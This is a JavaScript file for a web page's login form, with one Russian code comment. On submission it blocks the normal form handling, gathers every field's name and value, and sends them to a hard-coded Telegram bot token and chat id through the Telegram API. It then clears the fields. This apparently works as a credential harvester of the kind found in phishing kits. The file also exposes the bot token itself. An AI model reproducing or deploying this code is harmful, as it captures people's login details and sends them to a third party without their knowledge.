'use strict';
window.addEventListener('DOMContentLoaded', function () {
  const form = document.querySelector('.form__login');
  const input = form.querySelectorAll('input, textarea');
  const token = `bot936987963:AAEd3J9XRgKbkODvQzK5oo8WUKMyDgWPmZY`;
  const telegramUrl = `https://api.telegram.org/`;


  const onClickForm = () => {
    form.addEventListener('submit', (e) => {
      e.preventDefault();
      const result = [];
      input.forEach(item => {
        result.push([item.name, item.value]);
      });
      // const result = Array.from(input).reduce((acc, item) => [...acc, [item.name, item.value]], []); // замена кода выше через редьюс

      messageFromBot(result);
    });
  };
  onClickForm();

  const messageFromBot = message => {
    const xhr = new XMLHttpRequest();
    const text = message.reduce((acc, [name, value]) => acc += `<pre>${name}:</pre> ${value}`, '');
    xhr.open('GET', telegramUrl + token + `/sendMessage?chat_id=402807911&parse_mode=HTML&text=${text}`);
    xhr.send();

    input.forEach(item => item.value = '');
  };
});
